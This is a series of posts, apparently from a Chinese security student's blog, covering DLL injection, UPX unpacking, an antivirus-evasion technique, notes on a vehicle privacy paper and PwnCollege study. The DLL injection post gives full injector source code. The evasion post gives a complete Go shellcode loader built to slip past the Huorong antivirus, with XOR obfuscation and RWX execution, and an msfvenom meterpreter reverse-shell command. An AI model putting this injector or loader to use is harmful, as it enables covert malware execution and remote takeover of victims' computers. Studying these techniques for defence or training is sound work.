[{"content":"1. 介绍\rDLL注入指的是向运行中的其他进程强制插入特定的DLL文件。从技术细节来说，DLL注入命令其他进程自行调用LoadLibrary() API,加载（Loading）用户指定的DLL文件。DLL注入与一般DLL加载的区别在于，加载的目标进程是其自身或其他进程。下图描述了DLL注入的概念。\n从图中可以看到，myhack.dll已被强制插入notepad进程（本来notepad并不会加载myhack.dll ）。加载到notepad.exe进程中的myhack.dll与已经加载到notepad.exe进程中的DLL（kemel32.dll、user32.dll） —样，拥有访问notepad.exe进程内存的（正当的）权限，这样用户就可以做任何想做的事了（比如：向notepad添加通信功能以实现Messenger、文本网络浏览器等）。\nDLL被加载到进程后会自动运行DllMain()函数，用户可以把想执行的代码放到DllMain()函数，每当加载DLL时，添加的代码就会自然而然得到执行。利用该特性可修复程序Bug,或向程序添加新功能。\nDLL（Dynamic Linked Library，动态链接库）被加载到进程后会自动运行DllMain()函数，用户可以把想执行的代码放到DllMain()函数，每当加载DLL时，添加的代码就会自然而然得到执行。利用该特性可修复程序Bug,或向程序添加新功能。\rBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)\r{\rswitch( dwReason )\r{\rcase DLL_PROCESS_ATTACH:\r// 添加想执行的代码\rbreak;\rcase DLL_THREAD_ATTACH:\rbreak;\rcase DLL_THREAD_DETACH:\rbreak;\tcase DLL_PROCESS_DETACH:\rbreak;\t}\rreturn TRUE;\r}\r2. DLL注入示例\r使用LoadLibrary() API加载某个DLL时，该DLL中的DllMain()函数就会被调用执行。DLL注入的工作原理就是从外部促使目标进程调用LoadLibrary() API （与一般DLL加载相同），所以会强制调用执行DLL的DllMain()函数。并且，被注入的DLL拥有目标进程内存的访问权限，用户可以随意操作（修复Bug、添加功能等）。下面看一些使用DLL注入技术的示例。\n2.1 改善功能与修复Bug\rDLL注入技术可用于改善功能与修复Bug。没有程序对应的源码，或直接修改程序比较困难时，就可以使用DLL注入技术为程序添加新功能（类似于插件），或者修改有问题的代码、数据。\n2.2 消息钩取\rWindows OS默认提供的消息钩取功能应用的就是一种DLL注入技术。与常规的DLL注入唯一的区别是，OS会直接将已注册的钩取DLL注入目标进程。\n2.3 API 钩取\rAPI钩取广泛应用于实际的项目开发，而进行API钩取时经常使用DLL注入技术。先创建好DLL形态的钩取函数，再将其轻松注入要钩取的目标进程，这样就完成了API钩取。这灵活运用了 “被注入的DLL拥有目标进程内存访问权限”这一特性\n2.4 其他应用程序\rDLL注入技术也应用于监视、管理PC用户的应用程序。比如，用来阻止特定程序（像游戏、股票交易等）运行、禁止访问有害网站，以及监视PC的使用等。管理员（或者父母）主要安装这类拦截/阻断应用程序来管理/监视。受管理/监视的一方当然千方百计地想关闭这些监视程序，但由于这些监视程序采用DLL注入技术，它们可以隐藏在正常进程中运行，所以管理员一般不用担心被发现或被终止（若用户强制终止Windows系统进程，也会一并关闭系统，最后也算达成了拦截/阻断这一目标）。\n2.5 恶意代码\r恶意代码制作者们是不会置这么好的技术于不顾的，他们积极地把DLL注入技术运用到自己制作的恶意代码中。这些入把自己编写的恶意代码隐藏到正常进程（winlogon.exe、services.exe、svchost.exe、explorer.exe等），打开后门端口（ Backdoor port ），尝试从外部连接，或通过键盘偷录（Keylogging）功能将用户的个入信息盗走。只有了解恶意代码制作者们使用的手法，才能拿出相应对策\n3. DLL注入的实现方法\r向某个进程注入DLL时主要使用以下三种方法：\n创建远程线程（CreateRemoteThread() API) 使用注册表（AppInit_DLLs值） 消息钩取（SetWindowsHookEx() API） 3.1 使用CreateRemoteThread()函数进行DLL注入\r将DLL1.dll注入到notepad.exe进程中,查看PID为4644\n使用管理员打开cmd，然后进行dll注入\nsudo .\\\\DLL注入.exe 4644 C:\\\\Users\\\\xxxxx\\\\Desktop\\\\恶意代码分析\\\\进程注入\\\\Dll1\\\\x64\\\\Debug\\\\Dll1.dll\r// DLL1.dll\r#include \u0026quot;windows.h\u0026quot;\r#include \u0026quot;tchar.h\u0026quot;\r#include \u0026quot;pch.h\u0026quot;\r#pragma comment(lib, \u0026quot;urlmon.lib\u0026quot;)\rHMODULE g_hMod = NULL;\rDWORD WINAPI ThreadProc(LPVOID lParam)\r{\r// 弹窗“Hello World!”\rMessageBox(NULL, L\u0026quot;Hello World!\u0026quot;, L\u0026quot;Message\u0026quot;, MB_OK);\rreturn 0;\r}\rBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\r{\rHANDLE hThread = NULL;\rg_hMod = (HMODULE)hinstDLL;\rswitch (fdwReason)\r{\rcase DLL_PROCESS_ATTACH: //加载时\rOutputDebugString(L\u0026quot;Injection!!!\u0026quot;); //输出调试字符串\rhThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); //创建线程\rCloseHandle(hThread);\rbreak;\r}\rreturn TRUE;\r}\r// DLL注入.cpp\r#include \u0026quot;windows.h\u0026quot;\r#include \u0026quot;tchar.h\u0026quot;\rBOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)\r{\rTOKEN_PRIVILEGES tp;\rHANDLE hToken;\rLUID luid;\rif (!OpenProcessToken(GetCurrentProcess(),\rTOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,\r\u0026amp;hToken))\r{\r_tprintf(L\u0026quot;OpenProcessToken error: %u\\\\n\u0026quot;, GetLastError());\rreturn FALSE;\r}\rif (!LookupPrivilegeValue(NULL, // lookup privilege on local system\rlpszPrivilege, // privilege to lookup \u0026amp;luid)) // receives LUID of privilege\r{\r_tprintf(L\u0026quot;LookupPrivilegeValue error: %u\\\\n\u0026quot;, GetLastError());\rreturn FALSE;\r}\rtp.PrivilegeCount = 1;\rtp.Privileges[0].Luid = luid;\rif (bEnablePrivilege)\rtp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\relse\rtp.Privileges[0].Attributes = 0;\r// Enable the privilege or disable all privileges.\rif (!AdjustTokenPrivileges(hToken,\rFALSE,\r\u0026amp;tp,\rsizeof(TOKEN_PRIVILEGES),\r(PTOKEN_PRIVILEGES)NULL,\r(PDWORD)NULL))\r{\r_tprintf(L\u0026quot;AdjustTokenPrivileges error: %u\\\\n\u0026quot;, GetLastError());\rreturn FALSE;\r}\rif (GetLastError() == ERROR_NOT_ALL_ASSIGNED)\r{\r_tprintf(L\u0026quot;The token does not have the specified privilege. \\\\n\u0026quot;);\rreturn FALSE;\r}\rreturn TRUE;\r}\rBOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)\r{\rHANDLE hProcess = NULL, hThread = NULL;\rHMODULE hMod = NULL;\rLPVOID pRemoteBuf = NULL;\rDWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);\rLPTHREAD_START_ROUTINE pThreadProc;\r// #1. 使用 dwPID 获取目标进程(notepad.exe)句柄（PROCESS_ALL_ACCESS权限），然后就可以用 hProcess 控制进程.\rif (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))\r{ //OpenProcess调用API，借助PID获取目标权限\r_tprintf(L\u0026quot;OpenProcess(%d) failed!!! [%d]\\\\n\u0026quot;, dwPID, GetLastError());\rreturn FALSE;\r}\r// #2. 在目标进程(notepad.exe) 内存中分配 szDllName 大小的内存，返回 pRemoteBuf 作为该缓冲区的地址.\rpRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);\r// #3. 将 myhack.dll 路径写入刚刚分配的缓冲区.\rWriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);\r// #4. 获取 LoadLibraryW() API 地址，kernel32.dll在每个进程中的加载地址相同（这个特性就是我们要利用的）.\rhMod = GetModuleHandle(L\u0026quot;kernel32.dll\u0026quot;);\rpThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, \u0026quot;LoadLibraryW\u0026quot;);\r// #5. 在 notepad.exe 中运行线程\rhThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);\rWaitForSingleObject(hThread, INFINITE);\rCloseHandle(hThread);\rCloseHandle(hProcess);\rreturn TRUE;\r}\rint _tmain(int argc, TCHAR* argv[])\r{\rif (argc != 3)\r{\r_tprintf(L\u0026quot;USAGE : %s \u0026lt;pid\u0026gt; \u0026lt;dll_path\u0026gt;\\\\n\u0026quot;, argv[0]);\rreturn 1;\r}\r// change privilege\rif (!SetPrivilege(SE_DEBUG_NAME, TRUE))\rreturn 1;\r// inject dll\rif (InjectDll((DWORD)_tstol(argv[1]), argv[2]))\r_tprintf(L\u0026quot;InjectDll(\\\\\u0026quot;%s\\\\\u0026quot;) success!!!\\\\n\u0026quot;, argv[2]);\relse\r_tprintf(L\u0026quot;InjectDll(\\\\\u0026quot;%s\\\\\u0026quot;) failed!!!\\\\n\u0026quot;, argv[2]);\rreturn 0;\r}\r3.2 使用注册表修改AppInit_DLLs实现注入（bios secure boot 已禁用）\r进行DLL注入的第二种方法是使用注册表，WindowsOS的注册表中默认提供了AppInit_DLLs与LoadAppInit_DLLs两个注册表项\n只要将要注入DLL的路径写入AppInit_DLLs项目，并在LoadAppInit_DLLs中设置值为1，重启时，系统就会将指定的DLL注入到所有运行进程中。主要原理是User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，若值为1，就调用LoadLibrary()函数加载用户DLL。所以严格来说，是将注入DLL加载到使用user32.dll的进程中。\n注：Windows XP会忽略LoadAppInit_DLLs注册表项。\n// 开启secure boot后的操作\r使用IDA打开Kernel32.dll 查看函数LoadAppInitDllsImplementation\rvoid LoadAppInitDllsImplementation()\r{\rstruct _PEB *v0; // rax\rint v1; // [rsp+50h] [rbp+10h] BYREF\rDWORD pcbData; // [rsp+58h] [rbp+18h] BYREF\rint pvData; // [rsp+60h] [rbp+20h] BYREF\rHKEY hkey; // [rsp+68h] [rbp+28h] BYREF\rif ( !MEMORY[0x7FFE02EC] )\r{\rv0 = NtCurrentPeb();\rif ( (v0-\u0026gt;BitField \u0026amp; 2) == 0\r\u0026amp;\u0026amp; ((v0-\u0026gt;BitField \u0026amp; 0x10) == 0 \u0026amp;\u0026amp; MEMORY[0x7FFE02F0] \u0026gt;= 0 || (unsigned int)BasepIsTestSigningEnabled())\r\u0026amp;\u0026amp; (!(unsigned int)BasepIsServiceSidBlocked(\u0026amp;v1) || !v1)\r\u0026amp;\u0026amp; (!(unsigned int)BasepAreExtensionPointsBlocked(\u0026amp;v1) || !v1)\r\u0026amp;\u0026amp; !RegOpenKeyExW(\rHKEY_LOCAL_MACHINE,\rL\u0026quot;Software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Windows\u0026quot;,\r0,\r0x20019u,\r\u0026amp;hkey) )\r{\rpcbData = 4;\rif ( !RegGetValueW(hkey, 0i64, L\u0026quot;LoadAppInit_DLLs\u0026quot;, 0x10u, 0i64, \u0026amp;pvData, \u0026amp;pcbData) )\r{\rif ( pvData )\rBasepLoadAppInitDlls(hkey);\r}\rRegCloseKey(hkey);\r}\r}\r}\r__int64 BasepIsTestSigningEnabled()\r{\runsigned int v0; // ebx\r__int64 SystemInformation; // [rsp+30h] [rbp+8h] BYREF\rv0 = 0;\rSystemInformation = 8i64;\rif ( NtQuerySystemInformation(MaxSystemInfoClass|SystemProcessInformation, \u0026amp;SystemInformation, 8u, 0i64) \u0026gt;= 0\r\u0026amp;\u0026amp; (SystemInformation \u0026amp; 0x200000000i64) != 0 )\r{\rreturn 1;\r}\rreturn v0;\r}\r// if ( NtQuerySystemInformation(MaxSystemInfoClass|SystemProcessInformation, \u0026amp;SystemInformation, 8u, 0i64) \u0026gt;= 0 \u0026amp;\u0026amp; (SystemInformation \u0026amp; 0x200000000i64) != 0 ) 判断是否为真\r0x2为 CODEINTEGRITY_OPTION_TESTSIGN。这个标志可以在bcdedit中设置，命令为 bcdedit.exe –set testsigning on，用于设置系统的test mode\r但是secure boot只有disable之后才能使用bcdedit设置这个Flag。\r那么我在这个注册表中注入DLL1.dll，启动界面弹出好多个”Hello World“ 🤣\n","date":"2024-08-29T17:26:06+08:00","image":"https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829171930019_hu17633831565525660115.png","permalink":"https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/","title":"DLL注入"},{"content":"1. Target 程序\rCRACKME\nCRACKME UPX\n解压密码：9unk\n目标：初步学习脱壳步骤，了解OEP（程序入口点）和 IAT（Import Address Table）\n2. 壳\rPE （Poreable Executable）也就是EXE和DLL文件所具有的压缩、加密、保护作用的东西，当然加壳也可以成为我们绕过杀软的一种方式（研究中）\n加壳的过程：\n将待加壳程序全部进行加密 壳子程序中新增一段解密程序 修改壳子程序的OEP到解密程序入口处 3. 壳运行原理（以UPX为例）\r首先对程序进行解密（解压缩）然后再执行程序\r如上图所示，PE文件使用UPX工具进行加壳（压缩），将\u0026quot;节1\u0026quot;和\u0026quot;节2\u0026quot;压缩到\u0026quot;压缩数据中\u0026quot;,并且在\u0026quot;新PE\u0026quot;中增加一段解密（解压）程序，将程序恢复。\r4. UPX加壳原理\rUPX加壳是一种压缩与加密技术，它将可执行文件进行压缩、加密并重新包装，以达到保护程序的目的。加壳后的程序在运行时会自动解压、解密并执行原始程序。这种加壳方式可以有效防止程序被轻易反编译或修改，从而提高软件的安全性。\n4.1 UPX加壳过程（UPX壳，Ultimate Packer for eXecutables，用于可执行文件压缩，减小文件大小，在运行时解压缩）\r​\t初始化：进程启动后，申请内存，内部包含空节\n先映射头部，当然也要对pe头进行操作 数据映射，把解压缩代码和压缩数据映射进内存 把各种表进行处理 运行压缩代码，跑压缩数据 还原数据，填充 行完解压缩代码后，跑到节区1去执行原来的功能（会存在大跳） 4.2 常见UPX魔改情况\r区段名被修改UPX → 1PX 使用010 Editor修改回去 如图\n将软件通过010 Editor打开，可以发现明确的UPX头部，此时使用Die可以轻松识别，当我们修改UPX头部信息为1PX时，此时程序任然可以正常运行，使用Die识别到UPX但是无法发现具体版本信息，此时使用UPX -d 进行脱壳是失败的。\n5. 脱壳\r5.1 直接脱壳\r如果能直接识别到UPX壳的话，直接使用UPX -d 进行脱壳如下\n5.2 手动脱壳(x64dbg)\r脱壳基本步骤：\n寻找 OEP 转储 修复 IAT（修复导入表） 检查目标程序是否存在 AntiDump 等组织程序被转储的保护措施，并尝试修复这些问题。 寻找OEP：\n单步跟踪法：主要使用 “F8” 和 “F4” 这两个快捷键，一步一步分析每一条汇编背后所代表的意思，将壳代码读懂，从而找到原始 OEP 然后脱壳。 ESP定律法：一般加壳程序在运行时，会先执行壳代码，然后在内存中恢复还原原程序，再跳转到原始OEP，执行原程序的代码。这些壳代码首先会使用 PUSHAD 指令保存寄存器环境，在解密各个区段完毕，跳往 OEP 之前会使用 POPAD 指令恢复寄存器环境。 内存镜像法：在加壳程序执行时，会先将源程序的 “CODE” 和 “DATA” 区段解压\\解密并载入内存，然后再载入 “rsrc” 资源到内存中，最后跳到 OEP 执行解密后的程序。内存镜像法就是在 rsrs 先设置一个内存执行断点，当程序停下来的时候说明程序已经解压\\解密完成。此时再到 “DATA” 区段设置内存执行断点，程序下一次会停在 OEP 入口点。 一步到达OEP（😀.jpg）：使用快捷键 “Ctrl+B” 搜索十六进制字符串 “E9 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00”，即可找到跳转 OEP 的位置；使用快捷键 “Ctrl+F” 搜索 popad。找的 popad 需要满足，在程序返回时，壳程序希望恢复现场环境的地方。也就是靠近 jmp 和 return 的地方。 5.2.1 ESP定律\rF9，运行到pushad指令，F7执行到下一行汇编指令，此时寄存器的值存储到栈顶，也就是 esp 的位置。 右击 esp 寄存器，选择在内存中跳转。此时才内存窗口可以看到当前存储的寄存器值，并如图设置硬件访问断点。 “F9” 运行程序后，程序断在如下位置。下面有个 jmp 指令，跳转到 OEP 处。OEP地址为：0x00409CAD 5.2.2 内存镜像法\r载入 UPX 程序，使用快捷键 “Alt+M” 进入到内存视图，对 “.rsrc” 区段设置内存访问断点 “F9” 运行upx程序到 “rsrc” 区段，此时前面两个区段已经解密好了。 再次到内存视图，使用 “F2” 对 “CODE” 区段设置内存执行断点。 继续 “F9” 执行代码，此时可以看到程序停在了 OEP 入口处（0x00409E23） 6. 修复IAT表\r设置OEP地址-\u0026gt; IAT Autosearch -\u0026gt; Get Imports -\u0026gt; Dump -\u0026gt; Fix Dump\n","date":"2024-06-27T13:26:06+08:00","image":"https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133422309_hu9544609347951171441.png","permalink":"https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/","title":"UPX脱壳初探(x64dbg)"},{"content":"1. Shellcode 加载器（go）\r我们先看最后的免杀代码\npackage main\rimport (\r\u0026quot;fmt\u0026quot;\r\u0026quot;os\u0026quot;\r\u0026quot;syscall\u0026quot;\r\u0026quot;unsafe\u0026quot;\r)\rconst (\rMEM_COMMIT = 0x1000\rMEM_RESERVE = 0x2000\rPAGE_EXECUTE_READWRITE = 0x40\r)\rvar (\rkernel32 = syscall.NewLazyDLL(\u0026quot;kernel32.dll\u0026quot;)\rntdll = syscall.NewLazyDLL(\u0026quot;ntdll.dll\u0026quot;)\rVirtualAlloc = kernel32.NewProc(\u0026quot;VirtualAlloc\u0026quot;)\rRtlCopyMemory = ntdll.NewProc(\u0026quot;RtlCopyMemory\u0026quot;)\r//shellcode_buf = []byte{\r//}\rshellcode_buf = []byte{\r}\r)\rfunc check(e error) {\rif e != nil {\rif e.Error() != \u0026quot;The operation completed successfully.\u0026quot; { // 内存错误\rfmt.Println(e.Error())\ros.Exit(1)\r}\r}\r}\rfunc main() {\r//// xor\rhomeDir, _ := os.UserHomeDir()\rxor := homeDir[3] // U -\u0026gt; 85\rdecimalValue := int(xor)\rshellcode := xorEncrypt(shellcode_buf, decimalValue)\r//shellcode := shellcode_buf\rfmt.Println(shellcode)\r// 申请内存\r// MEM_COMMIT|MEM_RESERVE\raddr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)\rif addr == 0 {\rcheck(err)\r}\r// 写入shellcode\r_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(\u0026amp;shellcode[0])), uintptr(len(shellcode)))\rcheck(err)\r// 执行shellcode\rsyscall.Syscall(addr, 0, 0, 0, 0)\r}\rfunc xorEncrypt(buf []byte, value int) []byte {\rfor i := 0; i \u0026lt; len(buf); i++ {\rbuf[i] ^= byte(value)\r}\rreturn buf\r}\r// go build -ldflags=\u0026quot;-H windowsgui -w -s\u0026quot; shellcodeLoader.go\r2. shellcode 生成\r对于shellcode的生成我们采用msf进行生成：\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxxx LPORT=xxxx -f c\r对于生成的shellcode，我们如果不进行处理，对于火绒这类的杀毒软件来说，做简单的静态分析，如果坚持到0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50···这些关键字节，肯定会报毒：Backdoor/W64.Meterpreter.f\n3.可能的绕过方式\r一般来说，为了防止shellcode被检测到，我们通过对shellcode进行处理，如base64加密，亦或等等操作，也可以考虑github的sgn工具。\n本文我们主要采用亦或操作（xor）\n我们先将msf生成的shellcode进行亦或操作：\n# xor.py shellcode = []\r# xor 85\rshellcode1 = ''.join(['\\\\x%02x' % i for i in shellcode])\rprint(shellcode1)\rfor i in range(len(shellcode)):\rshellcode[i] ^= 85\r# 0x格式化输出\rshellcode = ''.join(['\\\\x%02x' % i for i in shellcode])\rprint(shellcode)\r再将shellcode进行替换，并且与目标值进行亦或，就可以获得正确的shellcode。\n但是当我们进行编译的时候，任然报毒。\nshellcode := xorEncrypt(shellcode_buf, 85)\rfunc xorEncrypt(buf []byte, value int) []byte {\rfor i := 0; i \u0026lt; len(buf); i++ {\rbuf[i] ^= byte(value)\r}\rreturn buf\r}\r这是由于火绒在检测的时候如果能明确看到85，会尝试亦或来还原shellcode，base64同理。\n所以我们就尝试如果隐藏85，通过读取用户目录来获取。\nhomeDir, _ := os.UserHomeDir()\rxor := homeDir[3] // U -\u0026gt; 85\rdecimalValue := int(xor)\r此时，shellcode是没有问题的，但是在进行编译的时候会遇到内存的报毒：\n这个原因是我们在申请内存时，设置内存权限为MEM_COMMIT|MEM_RESERVE；\n我们将内存权限设置为MEM_COMMIT就可以了。\n4. 免杀效果\r查看能否上线\n5. 总结\r这是第一次尝试免杀，之前一直在学习pwn和web安全，但是在前段时间的上海市大学生磐石行动的比赛中，发现内网中存在杀毒软件，且无法及时绕过，虽然通过文件包含读取到了flag，但是却阻止了我们进一步的渗透利用，最后也只获得了第十一名，与决赛遗憾错过。\n回来之后，反思了很多，觉得还是要对免杀进行一部分的学习，go语言的shellcode免杀通过微信推文看到的，决定挺有意思的，便在之后的学习中进行尝试，没想到就成功绕过了火绒（其他杀毒软件还没有尝试过），但是这也激起了我学习的热情。\n此外，最近也收到了实验室导师的任务，给本科生同学们准备渗透测试（CTF）的课程，也觉得免杀蛮重要的，顺便也一起给讲了。\n学无止境，脚踏实地。\n","date":"2024-06-03T16:22:34+08:00","image":"https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603162742164_hu4531776833353852111.png","permalink":"https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/","title":"Go语言ShellCode免杀火绒"},{"content":"V2V电车能量交换\rVehicle-to-Vehicle Energy Sharing Scheme: A Privacy-Preserving Solution based on Local Differential Privacy Method\n贡献点：\n自适应隐私预算分配( Adaptive Privacy Budget Allocation，APA )模型，通过隐私预算分配来平衡数据失真和隐私泄露风险。 平衡数据隐私保护水平和数据效用的高效用扰动( HUP )模型。 改进轨迹隐私保护的隐私加权平均( PWA )模型。 Implementation of VES scheme\rAPA模型 自适应隐私计算分配模型 用来平衡噪声和信息可用性\r原始位置经历LDP（本地差分隐私）扰动【添加噪声】。使用高斯核函数和哈曼顿距离来衡量两个位置之间的相似性（S，公式1）\nAPA Model\r公式1：使用高斯核函数和曼哈顿距离来衡量位置的相似性，参数σ表示缩放参数，决定了相似性随着距离递减而放大的速率。S的取值范围是[0,1]。\n公式2：轨迹信息泄露量(TIL) = 求和[1/(相似性×距离)]？\n公式3：εremain表示剩余的隐私预算，εtotal表示总体隐私预算，εk表示指定位置隐私预算支出。\n公式4：εmin 和 εmax分别**：**引入ε min来避免将微薄的预算分配到后续位置，ε max是最大隐私预算上限的阈值。\nHUP模型 平衡数据隐私保护水平和数据效用的高效用扰动\r使用HUP模型的主要目的是在使用LDP方法保护数据隐私的同时，尽可能地保留原始数据的有用信息。例如，当我们需要共享敏感数据时，我们可以使用位置扰动算法对一些数据点的位置进行扰动，而不是完全按照LDP方法修改数据点的值。（不是很能理解）\nHUP model\r因此，为了最小化参与者的轨迹隐私泄露风险和最大化统计效用，我们提出了基于阈值的位置扰动( TPP )算法来获得扰动位置。\nTPP算法在保证数据效用的同时，优化了Hausdorff距离不变性的数据处理流程。\nAlgorithm 1\rPWA 改进轨迹隐私保护的隐私加权平均 （防止扰动位置太假了，容易被辨别出来）\rPWA Model\r问题：\r该文章使用了差分隐私的扰乱机制的具体技术？文章中并没有提到说使用什么扰动机制。只提到了LDP，local 差分隐私。 该方案中APA模型中的第三步，第四步的具体含义？ 答：APA隐私预算自适应分配模型，隐私预算较大时，噪声较高，保护水平高，但是信息可用性会收到影响；当隐私预算较小时，噪声较低，保护水平低，但是信息的可用性较高。 对于剩余隐私预算 答：对于公式3来说，As evident from Fig. 3, formulas 3 and 4, the initial step involves the computation of the remaining privacy budget, denoted as εremain, for positions within the window [iω + 1, i].文章中说到这个公式求和的时候，位置[iw+1,i]区间剩余的隐私度量。 懂了，使用TILremain，表示之前的隐私泄露量隐私预算，达到考虑之前所以的差分隐私位置的影响。 公式\r","date":"2024-05-17T14:27:25+08:00","image":"https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517144025453_hu17265310475329964766.png","permalink":"https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/","title":"Vehicle-to-Vehicle Energy Sharing Scheme: A Privacy-Preserving Solution based on Local Differential Privacy Method"},{"content":"1. 学习路线\r作为一名网络安全的学生，最开始接触到的就是web安全。但是在学习web安全的过程中，逐渐发现web安全需要更多更广的知识面。但是这对于现在的我来说是不现实的，因为在读研过程中，花费更时间去阅读论文和完成导师的项目。\n此外，总是听见别人说，pwn爷，pwn爷的，也觉得学习pwn，二进制安全是很厉害的。不过也正式因为如此，pwn的学习需要很多基本知识（汇编，C/C++，linux安全机制，堆栈相关知识等）。总之就是需要很多知识作为铺垫才能帮助去深入理解pwn的原理和技术。\n2. PwnCollege\r众所周知，学习安全技术，特别是这种国内敏感技术，很多国内的网站是无法找到资源的。机缘巧合之前，我认识了一个大佬同学（腾讯安全、UCI博士在读），在他的建议下，我开始尝试pwnCollege的学习。作为一个英语高考只有100分的我来说，在学习过程中确实遇到了很多很多的困难。\n但是兴趣是最好的老师，这个课程的学习相比课堂上的读PPT会更加有趣且令人心动。在这种兴趣的不断吸引下，我从23年8月份开始学习pwnCollege的CES-466课程，截至目前位置已经完成一半内容 的学习。当然距离蓝带的路还是很远很远。\n从最简单的程序交互-\u0026gt;汇编基础-\u0026gt;shellcode注入-\u0026gt;debug-\u0026gt;逆向工程。。。\n在这些学习过程中，我收获很多，开始逐渐向着计算机底层靠近。\n3. 感受\r通过冯诺依曼结构的代码段和text段没有明显区别可以在堆栈上写入shellcode，去执行恶意代码；\n设置ROP完成系统调用；格式化字符串泄露程序carry，爆破PIE，libc地址泄露，任意内存读写去修改汇编指令完成程序执行流（CFI）的控制，这些都是我在学习中获得的知识。每一次过题，都是一种前所未有的幸福，不仅仅是自己的知识增长了，更重要的是，解开了所谓”抽象“的面纱。\n","date":"2024-05-17T13:26:06+08:00","image":"https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517133556992_hu2792591941855178450.png","permalink":"https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","title":"PwnCollege 学习笔记"}]